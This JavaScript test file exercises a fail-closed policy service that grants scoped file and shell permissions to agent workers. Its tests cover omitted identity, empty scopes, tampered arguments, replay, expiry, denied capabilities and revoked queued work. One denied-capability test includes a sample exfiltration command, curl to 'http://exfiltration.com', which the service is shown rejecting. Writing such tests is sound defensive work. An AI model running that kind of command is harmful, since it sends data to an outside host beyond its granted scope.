/**
 * @file test/negative-fixtures.test.js
 * Explicit negative fixtures for fail-closed policy enforcement:
 * - Omitted identity (principal/session)
 * - Empty scopes (paths, commands, actionTypes)
 * - Changed arguments (parameter tampering)
 * - Replay (consumed requests and one-use approvals)
 * - Expiry boundary (exact millisecond boundary and premature evaluation)
 * - Denied capability (unpermitted actionType, path, or command)
 * - Revoked queued work (effect-time revocation defense)
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { PolicyService } from '../src/policy-service.js';
import {
  ActionType,
  SCHEMA_VERSIONS,
  createActionRequest
} from '../../protocol/src/index.js';
import { PolicyValidationError } from '../src/errors.js';

describe('Policy Negative Fixtures & Fail-Closed Enforcement', () => {
  let currentTime = 1700000000000;
  let policy;

  const validGrant = {
    schemaVersion: SCHEMA_VERSIONS.GRANT,
    grantId: 'grant-fixture',
    principalId: 'worker-alpha',
    sessionId: 'session-alpha',
    scope: {
      actionTypes: [ActionType.FILE_READ, ActionType.FILE_WRITE, ActionType.SHELL_EXEC],
      allowedPaths: ['packages/policy', 'src'],
      allowedCommands: ['npm', 'node']
    },
    issuedAt: 1700000000000,
    expiresAt: 1700000060000, // 60s
    revoked: false,
    issuerId: 'coordinator'
  };

  beforeEach(() => {
    currentTime = 1700000000000;
    policy = new PolicyService({ clock: () => currentTime });
    policy.issueGrant(validGrant);
  });

  // =========================================================================
  // 1. Omitted Identity
  // =========================================================================
  describe('Fixture 1: Omitted Identity', () => {
    it('fails closed when ActionRequest omits principalId', () => {
      const res = policy.evaluate({
        schemaVersion: SCHEMA_VERSIONS.ACTION_REQUEST,
        requestId: 'req-no-principal',
        taskId: 't1',
        attemptId: 1,
        // principalId omitted
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      assert.equal(res.granted, false);
      assert.equal(res.reason, 'invalid_request');
    });

    it('fails closed when request omits sessionId against a session-scoped grant', () => {
      const reqNoSession = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        // sessionId omitted!
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      const res = policy.evaluate(reqNoSession, { grantId: 'grant-fixture' });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'session_mismatch');
      assert.equal(res.details.received, null);
    });

    it('fails closed when principalId does not match grant', () => {
      const reqBadPrincipal = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-imposter',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      const res = policy.evaluate(reqBadPrincipal);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'no_matching_grant');
    });

    it('fails closed when sessionId does not match grant', () => {
      const reqBadSession = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-different',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      const res = policy.evaluate(reqBadSession);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'no_matching_grant');
    });
  });

  // =========================================================================
  // 2. Empty Scopes
  // =========================================================================
  describe('Fixture 2: Empty Scopes', () => {
    it('fails closed when grant has empty allowedPaths on file action', () => {
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-empty-paths',
        sessionId: 'session-empty-paths',
        scope: {
          actionTypes: [ActionType.FILE_READ],
          allowedPaths: [] // empty paths
        }
      });

      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-empty-paths',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'no_paths_in_grant_scope');
    });

    it('fails closed when grant lacks both allowedCommands and exactRequestDigest', () => {
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-no-cmds',
        sessionId: 'session-no-cmds',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/policy']
          // neither allowedCommands nor exactRequestDigest
        }
      });

      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-no-cmds',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['npm', 'test'], cwd: 'packages/policy' }
      });

      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'unscoped_shell_command');
    });

    it('rejects issuance of grant with empty allowedCommands array', () => {
      assert.throws(
        () => policy.issueGrant({
          ...validGrant,
          grantId: 'grant-empty-cmds-arr',
          sessionId: 'session-empty-cmds',
          scope: {
            actionTypes: [ActionType.SHELL_EXEC],
            allowedPaths: ['packages/policy'],
            allowedCommands: [] // empty array rejected at schema admission
          }
        }),
        (err) => {
          assert(err instanceof PolicyValidationError);
          assert(err.errors.some(e => e.includes('scope.allowedCommands')));
          return true;
        }
      );
    });

    it('rejects issuance of grant with empty actionTypes array', () => {
      assert.throws(
        () => policy.issueGrant({
          ...validGrant,
          grantId: 'grant-no-actions',
          sessionId: 'session-no-actions',
          scope: {
            actionTypes: [], // empty actionTypes rejected at schema admission
            allowedPaths: ['src']
          }
        }),
        (err) => {
          assert(err instanceof PolicyValidationError);
          assert(err.errors.some(e => e.includes('scope.actionTypes')));
          return true;
        }
      );
    });
  });

  // =========================================================================
  // 3. Changed Arguments (Parameter Tampering)
  // =========================================================================
  describe('Fixture 3: Changed Arguments', () => {
    it('fails closed when action parameters are tampered after exact-request approval grant', () => {
      // 1. Safe approved request: delete temporary file
      const approvedReq = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-tamper',
        actionType: ActionType.FILE_WRITE,
        parameters: { path: 'packages/policy/temp.txt', patch: 'safe' }
      });

      // 2. Grant issued specifically bound to approved requestDigest
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-exact-approval',
        sessionId: 'session-tamper',
        scope: {
          actionTypes: [ActionType.FILE_WRITE],
          allowedPaths: ['packages/policy'],
          exactRequestDigest: approvedReq.requestDigest // Bound to exact digest!
        }
      });

      // 3. Tampered request: attacker changes path to a sensitive file while reusing requestId/digest
      const tamperedReq = {
        ...approvedReq,
        parameters: { path: 'packages/policy/src/errors.js', patch: 'malicious' }
      };

      // When evaluated, requestDigest validation fails closed!
      const res = policy.evaluate(tamperedReq);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'invalid_request');
      assert(res.details.errors.some(e => e.includes('requestDigest mismatch')));
    });

    it('fails closed when request parameters mismatch grant exactRequestDigest', () => {
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-digest-locked',
        sessionId: 'session-digest',
        scope: {
          actionTypes: [ActionType.FILE_WRITE],
          allowedPaths: ['packages/policy'],
          exactRequestDigest: 'a'.repeat(64) // Bound to different digest
        }
      });

      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-digest',
        actionType: ActionType.FILE_WRITE,
        parameters: { path: 'packages/policy/test.txt', patch: 'content' }
      });

      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'exact_request_digest_mismatch');
    });
  });

  // =========================================================================
  // 4. Replay Protection
  // =========================================================================
  describe('Fixture 4: Replay Protection', () => {
    it('fails closed when a previously consumed request is replayed', () => {
      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_WRITE,
        parameters: { path: 'packages/policy/file.txt', patch: 'patch 1' }
      });

      // First run: authorize and consume succeeds
      const first = policy.authorizeAndConsume(req);
      assert.equal(first.granted, true);
      assert.equal(first.reason, 'authorized_and_consumed');

      // Replay attempt fails closed immediately
      const replay = policy.authorizeAndConsume(req);
      assert.equal(replay.granted, false);
      assert.equal(replay.reason, 'request_already_consumed');
      assert.equal(replay.details.requestId, req.requestId);
    });

    it('fails closed when one-use grant is evaluated again after consumption', () => {
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-one-use',
        sessionId: 'session-one-use',
        oneUse: true
      });

      const req1 = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-one-use',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      const req2 = createActionRequest({
        taskId: 't1',
        attemptId: 2,
        principalId: 'worker-alpha',
        sessionId: 'session-one-use',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      // First request consumes the one-use grant
      const first = policy.authorizeAndConsume(req1);
      assert.equal(first.granted, true);

      // Underlying grant was revoked on consumption
      assert.equal(policy.getGrant('grant-one-use').revoked, true);

      // Second request with different requestId fails closed because grant is revoked
      const second = policy.evaluate(req2);
      assert.equal(second.granted, false);
      assert.equal(second.reason, 'grant_revoked');
    });
  });

  // =========================================================================
  // 5. Expiry Boundary
  // =========================================================================
  describe('Fixture 5: Expiry Boundary', () => {
    it('fails closed at exact millisecond of expiration (currentTime === expiresAt)', () => {
      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      // Exact expiry boundary: 1700000060000
      currentTime = 1700000060000;
      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_expired');
      assert.equal(res.details.exceededByMs, 0);
    });

    it('fails closed 1 ms after expiration boundary', () => {
      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      currentTime = 1700000060001;
      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_expired');
      assert.equal(res.details.exceededByMs, 1);
    });

    it('authorizes 1 ms before expiration boundary', () => {
      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      currentTime = 1700000059999;
      const res = policy.evaluate(req);
      assert.equal(res.granted, true);
    });

    it('fails closed when currentTime is before grant issuedAt (premature evaluation)', () => {
      const req = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'src/index.js' }
      });

      currentTime = 1700000000000 - 1; // 1 ms before issuedAt
      const res = policy.evaluate(req);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_not_yet_valid');
    });
  });

  // =========================================================================
  // 6. Denied Capability
  // =========================================================================
  describe('Fixture 6: Denied Capability', () => {
    it('fails closed when requesting unpermitted action type', () => {
      policy.issueGrant({
        ...validGrant,
        grantId: 'grant-read-only',
        sessionId: 'session-readonly',
        scope: {
          actionTypes: [ActionType.FILE_READ],
          allowedPaths: ['src']
        }
      });

      const writeReq = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-readonly',
        actionType: ActionType.FILE_WRITE, // Not granted!
        parameters: { path: 'src/index.js', patch: 'mutated' }
      });

      const res = policy.evaluate(writeReq);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'action_type_not_permitted');
    });

    it('fails closed when path is outside allowedPaths', () => {
      const reqOutsidePath = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'packages/other-service/secret.json' } // Not in allowedPaths!
      });

      const res = policy.evaluate(reqOutsidePath);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'path_outside_grant_scope');
    });

    it('fails closed when shell command is outside allowedCommands', () => {
      const reqCurl = createActionRequest({
        taskId: 't1',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['curl', 'http://exfiltration.com'], cwd: 'packages/policy' }
      });

      const res = policy.evaluate(reqCurl);
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'command_not_permitted');
    });
  });

  // =========================================================================
  // 7. Revoked Queued Work (Effect-Time Revocation Defense)
  // =========================================================================
  describe('Fixture 7: Revoked Queued Work Defense', () => {
    it('prevents effect execution when grant was revoked while request sat in queue', () => {
      // 1. Worker creates request at t0
      const queuedReq = createActionRequest({
        taskId: 'task-queued',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_WRITE,
        parameters: { path: 'packages/policy/src/index.js', patch: 'effect mutation' }
      });

      // 2. Queue-time pre-check succeeds
      currentTime = 1700000005000;
      const queueCheck = policy.evaluate(queuedReq, { grantId: 'grant-fixture' });
      assert.equal(queueCheck.granted, true);

      // 3. While work sits in queue, supervisor triggers emergency stop / grant revocation at t1
      currentTime = 1700000010000;
      policy.revokeGrant('grant-fixture', 'emergency_stop_triggered');

      // 4. Queue worker pops job at t2 and calls recheckAtEffectTime immediately before effect
      currentTime = 1700000015000;
      let mutationOccurred = false;
      const effectRecheck = policy.recheckAtEffectTime(queuedReq, 'grant-fixture');

      if (effectRecheck.granted) {
        mutationOccurred = true;
      }

      // Must fail closed: mutation prevented!
      assert.equal(mutationOccurred, false);
      assert.equal(effectRecheck.granted, false);
      assert.equal(effectRecheck.reason, 'grant_revoked');
      assert.equal(effectRecheck.details.revocationReason, 'emergency_stop_triggered');
    });

    it('prevents effect execution when session was revoked while request sat in queue', () => {
      const queuedReq = createActionRequest({
        taskId: 'task-session-queued',
        attemptId: 1,
        principalId: 'worker-alpha',
        sessionId: 'session-alpha',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['npm', 'test'], cwd: 'packages/policy' }
      });

      // In queue, supervisor revokes session
      policy.revokeSession('session-alpha', 'user_cancelled_task');

      // Recheck at effect time fails closed
      const res = policy.recheckAtEffectTime(queuedReq, 'grant-fixture');
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_revoked');
    });
  });
});
